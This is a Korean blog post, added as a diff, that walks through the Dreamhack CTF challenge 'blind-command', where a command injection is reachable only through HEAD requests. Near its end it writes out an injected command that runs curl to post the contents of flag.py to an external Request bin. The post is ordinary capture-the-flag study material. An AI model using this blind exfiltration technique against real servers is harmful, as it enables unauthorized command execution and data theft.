@@ -1,0 +1,22 @@
+---
+layout: post
+title:  "[Dreamhack] blind-command"
+date:   2025-03-13 08:42:22 +0900
+featured: /assets/images/블로그2.jpg
+categories: jekyll update
+---
+<p>안녕하세요! 이번 문제는 드림핵 Epilogue에 있는 2번째 CTF입니다.</p>
+<img src="/assets/images/p2-1.PNG" style="max-width: 100%; height: auto;"> 
+<p>페이지를 보면 "cmd=?"가 출력되있으며, command injection이라는 것을 확인이 가능합니다.</p>
+<img src="/assets/images/p2-2.PNG" style="max-width: 100%; height: auto;"> 
+<p>하지만 url로 "cat flag.py"를 입력하면 문자 그대로 랜딩되는 것을 알 수 있습니다.</p>
+<img src="/assets/images/p2-3.PNG" style="max-width: 100%; height: auto;"> 
+<p>혹시 GET 아닌 다른 메소드로 전송이 가능한지, OPTIONS으로 메소드를 확인해보았습니다.</p>
+<img src="/assets/images/p2-6.PNG" style="max-width: 100%; height: auto;"> 
+<p>허용된 HEAD를 사용해서 전송해보니, 정상적으로 전송되는 것을 확인 가능합니다. 하지만 HEAD는 응답을 받지 못하는데요.</p>
+<img src="/assets/images/p2-5.PNG" style="max-width: 100%; height: auto;"> 
+<p>저는 요청을 다른 IP 또는 URL로 커맨드 결과를 전송할수 있는 curl 커맨드 와, 그 요청을 받을 수 있는 드림핵에서 지원해주는 Request bin이라는 페이지를 사용하였습니다.</p>
+<img src="/assets/images/p2-7.png" style="max-width: 100%; height: auto;">
+<p>?cmd=curl -X -POST https://~ $(cat flag.py)를 인코딩하여 버프 스위트로 GET을 HEAD로 변경하여 전송합니다.</p>
+<img src="/assets/images/p2-8.png" style="max-width: 100%; height: auto;"> 
+<p>Request bin 페이지를 보면 flag값을 수신한 것을 볼 수 있습니다.</p>
